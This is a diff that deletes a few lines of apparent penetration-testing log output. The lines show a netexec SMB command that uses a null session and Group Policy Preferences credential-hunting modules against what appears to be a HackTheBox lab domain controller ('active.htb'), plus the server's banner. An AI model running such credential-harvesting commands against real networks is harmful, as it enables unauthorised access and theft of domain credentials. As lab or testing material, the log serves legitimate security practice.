@@ -1,4 +1,0 @@
-[03-03-2025 05:19:53]> /root/.local/bin/netexec smb /root/tools/linWinPwn/forest/linWinPwn_active.htb_null/DomainRecon/Servers/dc_ip_list_active.htb.txt -d active.htb -u  -p  -M gpp_autologin -M gpp_password --log /root/tools/linWinPwn/forest/linWinPwn_active.htb_null/DomainRecon/ne_gpp_output_active.htb.txt
-
-2025-03-03 05:20:00 | smb.py:320 - INFO - SMB         10.10.10.100    445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
-2025-03-03 05:20:02 | smb.py:471 - INFO - SMB         10.10.10.100    445    DC               [+] active.htb\: 
